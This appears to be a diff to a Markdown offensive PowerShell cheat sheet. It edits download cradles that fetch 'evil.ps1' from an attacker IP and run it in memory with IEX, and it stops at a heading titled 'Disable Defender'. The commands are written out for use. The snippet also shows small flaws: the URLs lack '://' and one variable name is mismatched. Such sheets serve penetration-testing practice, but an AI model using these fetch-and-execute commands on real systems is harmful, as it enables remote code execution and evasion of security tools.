@@ -47,9 +47,9 @@ C:> $wr=[System.NET.WebRequest]::Create("http 192.168.230.1/evil.ps1")
 C:> $r=$w. GetResponse()
 C:> IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
 ```
-PSv3 Onwards:
+**PSv3 Onwards:**
 ```powershell
-C:> iex (iwr 'http 192.168.230.1/evil.ps1')
+C:> iex (iwr 'http 192.168.230.1/evil.ps1' -UseBasicParsing)
 ```
 
 ### Disable Defender
